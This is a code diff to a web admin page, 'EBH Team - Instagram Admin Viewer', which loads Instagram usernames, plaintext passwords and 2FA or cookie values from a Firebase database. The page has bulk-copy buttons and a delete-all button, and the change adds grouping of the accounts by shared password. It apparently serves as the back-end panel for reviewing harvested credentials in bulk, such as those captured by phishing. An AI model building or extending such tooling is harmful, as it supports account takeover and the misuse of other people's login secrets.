@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>EBH Team - Instagram Admin Viewer (2FA Version)</title>
+<title>EBH Team - Instagram Admin Viewer (2FA Version) - Password Grouped</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -310,6 +310,38 @@ body {
 
 .account-row:hover {
   background: rgba(255, 51, 133, 0.1);
+}
+
+/* Password Group Header - NEW STYLE */
+.password-group-header {
+  display: table-row;
+  background: rgba(255, 51, 133, 0.15);
+  border-bottom: 2px solid var(--primary);
+  border-top: 2px solid var(--primary);
+  font-weight: bold;
+}
+
+.password-group-header .row-cell {
+  background: transparent;
+  border-right: none;
+  padding: 8px 6px;
+}
+
+.password-group-header .serial-cell {
+  font-size: 0.8rem;
+  color: var(--text-gray);
+  font-weight: normal;
+}
+
+.group-count {
+  background: var(--primary);
+  color: var(--dark-bg);
+  padding: 2px 8px;
+  border-radius: 30px;
+  font-size: 0.7rem;
+  margin-left: 8px;
+  font-weight: 700;
+  display: inline-block;
 }
 
 .row-cell {
@@ -685,14 +717,19 @@ body {
 
 <div class="container">
   <div class="header">
-    <h1><i class="fab fa-instagram"></i> EBH 2FA ADMIN <i class="fas fa-shield-alt"></i></h1>
-    <div class="subtitle">Username / Password / 2FA Data</div>
+    <h1><i class="fab fa-instagram"></i> EBH 2FA GROUPED <i class="fas fa-shield-alt"></i></h1>
+    <div class="subtitle">Password Grouped • Largest Group First</div>
   </div>
   
   <div class="stats-card">
     <div class="stat">
       <span class="number" id="totalCount">0</span>
       <span class="label">TOTAL</span>
+    </div>
+    <div class="divider"></div>
+    <div class="stat">
+      <span class="number" id="groupCount">0</span>
+      <span class="label">GROUPS</span>
     </div>
     <div class="divider"></div>
     <div class="stat">
@@ -719,7 +756,7 @@ body {
   
   <div class="main-card">
     <div class="card-header">
-      <h2 class="card-title"><i class="fas fa-database"></i> 2FA ACCOUNTS</h2>
+      <h2 class="card-title"><i class="fas fa-database"></i> GROUPED 2FA ACCOUNTS</h2>
       <button class="refresh-btn" onclick="loadData()">
         <i class="fas fa-sync-alt"></i> REFRESH
       </button>
@@ -734,7 +771,7 @@ body {
       </div>
     </div>
     
-    <div class="count-display" id="countDisplay">0 accounts</div>
+    <div class="count-display" id="countDisplay">0 accounts in 0 groups</div>
     
     <div class="copy-buttons-container">
       <button class="copy-btn-square username-btn-square" onclick="copyUsernames()" title="Copy Usernames">
@@ -759,7 +796,7 @@ body {
   </div>
   
   <div class="footer">
-    <p>EBH TEAM • 2FA SYSTEM • MTWork Database</p>
+    <p>EBH TEAM • PASSWORD GROUPED 2FA SYSTEM • MTWork Database</p>
   </div>
 </div>
 
@@ -802,6 +839,7 @@ const db = firebase.database();
 
 const accountsContainer = document.getElementById("accountsContainer");
 const totalCount = document.getElementById("totalCount");
+const groupCount = document.getElementById("groupCount");
 const searchCount = document.getElementById("searchCount");
 const searchLabel = document.getElementById("searchLabel");
 const searchResultCard = document.getElementById("searchResultCard");
@@ -812,7 +850,8 @@ const deleteCount = document.getElementById("deleteCount");
 const searchInput = document.getElementById("searchInput");
 
 let allAccounts = [];
-let filteredAccounts = [];
+let groupedAccounts = []; // Array of { password, accounts[] }
+let filteredGroups = [];
 let isSearching = false;
 let currentSearchTerm = "";
 
@@ -827,11 +866,37 @@ function showLoading() {
   `;
 }
 
+function groupAccountsByPassword(accounts) {
+  const groups = {};
+  
+  accounts.forEach(account => {
+    const password = account.password || "NO_PASSWORD";
+    if (!groups[password]) {
+      groups[password] = [];
+    }
+    groups[password].push(account);
+  });
+  
+  // Convert to array and sort by group size (largest first)
+  const groupedArray = Object.keys(groups).map(password => ({
+    password: password,
+    accounts: groups[password],
+    count: groups[password].length
+  }));
+  
+  // Sort by count descending (largest group first)
+  groupedArray.sort((a, b) => b.count - a.count);
+  
+  return groupedArray;
+}
+
 function updateStats() {
   const total = allAccounts.length;
-  const searchResults = filteredAccounts.length;
+  const groups = groupedAccounts.length;
+  const searchResults = filteredGroups.reduce((sum, group) => sum + group.accounts.length, 0);
   
   totalCount.textContent = total;
+  groupCount.textContent = groups;
   
   if (isSearching && currentSearchTerm) {
     searchCount.textContent = searchResults;
@@ -841,7 +906,7 @@ function updateStats() {
     searchResultCard.style.display = 'none';
   }
   
-  countDisplay.textContent = `${isSearching ? searchResults : total} accounts`;
+  countDisplay.textContent = `${isSearching ? searchResults : total} accounts in ${isSearching ? filteredGroups.length : groups} groups`;
   deleteCount.textContent = total;
   
   const now = new Date();
@@ -849,8 +914,8 @@ function updateStats() {
   lastUpdate.textContent = `${timeStr}`;
 }
 
-function renderAccountsTable(accounts) {
-  if (accounts.length === 0) {
+function renderAccountsTable(groups) {
+  if (groups.length === 0 || groups.every(g => g.accounts.length === 0)) {
     const noDataMessage = isSearching && currentSearchTerm 
       ? `No accounts found for "${currentSearchTerm}"`
       : "No accounts in database";
@@ -878,27 +943,51 @@ function renderAccountsTable(accounts) {
       </div>
   `;
   
-  accounts.forEach((account, index) => {
-    const username = account.username || account.uid || account.user || 'N/A';
-    const password = account.password || account.pass || 'N/A';
-    const twofa = account.twofa || account.cookie_2fa || account.cookie || account.cookies || account.twofa_key || account.tfa || account['2fa'] || 'N/A';
-    
+  let globalIndex = 0;
+  
+  groups.forEach(group => {
+    // Add group header row
     tableHTML += `
-      <div class="account-row">
+      <div class="password-group-header">
         <div class="row-cell serial-cell">
-          <div class="cell-content">${index + 1}</div>
+          <div class="cell-content">📁</div>
         </div>
         <div class="row-cell username-cell">
-          <div class="cell-content" title="${username}">${username}</div>
+          <div class="cell-content">
+            <i class="fas fa-key" style="margin-right: 5px; color: var(--secondary);"></i> 
+            <strong style="color: var(--secondary);">${group.password === "NO_PASSWORD" ? "⚠️ No Password" : group.password}</strong>
+            <span class="group-count">${group.count}</span>
+          </div>
         </div>
         <div class="row-cell password-cell">
-          <div class="cell-content" title="${password}">${password}</div>
+          <div class="cell-content"></div>
         </div>
         <div class="row-cell twofa-cell">
-          <div class="cell-content" title="${twofa}">${twofa}</div>
+          <div class="cell-content"></div>
         </div>
       </div>
     `;
+    
+    // Add accounts for this group
+    group.accounts.forEach(account => {
+      globalIndex++;
+      tableHTML += `
+        <div class="account-row">
+          <div class="row-cell serial-cell">
+            <div class="cell-content">${globalIndex}</div>
+          </div>
+          <div class="row-cell username-cell">
+            <div class="cell-content" title="${account.username || 'N/A'}">${account.username || 'N/A'}</div>
+          </div>
+          <div class="row-cell password-cell">
+            <div class="cell-content" title="${account.password || 'N/A'}">${account.password || 'N/A'}</div>
+          </div>
+          <div class="row-cell twofa-cell">
+            <div class="cell-content" title="${account.twofa || 'N/A'}">${account.twofa || 'N/A'}</div>
+          </div>
+        </div>
+      `;
+    });
   });
   
   tableHTML += '</div>';
@@ -979,8 +1068,9 @@ function loadData() {
       )
     );
     
-    filteredAccounts = [...allAccounts];
-    renderAccountsTable(allAccounts);
+    groupedAccounts = groupAccountsByPassword(allAccounts);
+    filteredGroups = [...groupedAccounts];
+    renderAccountsTable(groupedAccounts);
     updateStats();
   })
   .catch(err => {
@@ -1005,28 +1095,48 @@ function searchData() {
     return;
   }
   
-  filteredAccounts = allAccounts.filter(account => 
-    (account.username && account.username.toLowerCase().includes(searchTerm)) ||
-    (account.password && account.password.toLowerCase().includes(searchTerm)) ||
-    (account.twofa && account.twofa.toLowerCase().includes(searchTerm))
-  );
+  // Filter groups based on search term
+  filteredGroups = groupedAccounts
+    .map(group => {
+      // Filter accounts within group that match search
+      const matchingAccounts = group.accounts.filter(account => 
+        (account.username && account.username.toLowerCase().includes(searchTerm)) ||
+        (account.password && account.password.toLowerCase().includes(searchTerm)) ||
+        (account.twofa && account.twofa.toLowerCase().includes(searchTerm))
+      );
+      
+      if (matchingAccounts.length > 0) {
+        return {
+          password: group.password,
+          accounts: matchingAccounts,
+          count: matchingAccounts.length
+        };
+      }
+      return null;
+    })
+    .filter(group => group !== null);
+  
+  // Sort filtered groups by size (largest first)
+  filteredGroups.sort((a, b) => b.count - a.count);
   
   isSearching = true;
   currentSearchTerm = searchTerm;
   
-  renderAccountsTable(filteredAccounts);
+  renderAccountsTable(filteredGroups);
   updateStats();
 }
 
 function copyUsernames() {
-  const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
+  const groupsToCopy = isSearching ? filteredGroups : groupedAccounts;
   
-  if (accountsToCopy.length === 0) {
+  if (groupsToCopy.length === 0 || groupsToCopy.every(g => g.accounts.length === 0)) {
     alert("No data to copy!");
     return;
   }
   
-  const usernames = accountsToCopy.map(account => account.username || "N/A").join("\n");
+  const usernames = groupsToCopy.flatMap(group => 
+    group.accounts.map(account => account.username || "N/A")
+  ).join("\n");
   
   navigator.clipboard.writeText(usernames)
     .then(() => {
@@ -1039,14 +1149,16 @@ function copyUsernames() {
 }
 
 function copyPasswords() {
-  const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
+  const groupsToCopy = isSearching ? filteredGroups : groupedAccounts;
   
-  if (accountsToCopy.length === 0) {
+  if (groupsToCopy.length === 0 || groupsToCopy.every(g => g.accounts.length === 0)) {
     alert("No data to copy!");
     return;
   }
   
-  const passwords = accountsToCopy.map(account => account.password || "N/A").join("\n");
+  const passwords = groupsToCopy.flatMap(group => 
+    group.accounts.map(account => account.password || "N/A")
+  ).join("\n");
   
   navigator.clipboard.writeText(passwords)
     .then(() => {
@@ -1059,14 +1171,16 @@ function copyPasswords() {
 }
 
 function copyTwoFA() {
-  const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
+  const groupsToCopy = isSearching ? filteredGroups : groupedAccounts;
   
-  if (accountsToCopy.length === 0) {
+  if (groupsToCopy.length === 0 || groupsToCopy.every(g => g.accounts.length === 0)) {
     alert("No data to copy!");
     return;
   }
   
-  const twofas = accountsToCopy.map(account => account.twofa || "N/A").join("\n");
+  const twofas = groupsToCopy.flatMap(group => 
+    group.accounts.map(account => account.twofa || "N/A")
+  ).join("\n");
   
   navigator.clipboard.writeText(twofas)
     .then(() => {
@@ -1109,7 +1223,8 @@ function deleteAllData() {
   db.ref("/").remove()
   .then(() => {
     allAccounts = [];
-    filteredAccounts = [];
+    groupedAccounts = [];
+    filteredGroups = [];
     isSearching = false;
     currentSearchTerm = "";
     searchResultCard.style.display = 'none';
@@ -1158,4 +1273,4 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 </body>
-</html>
+</html>'
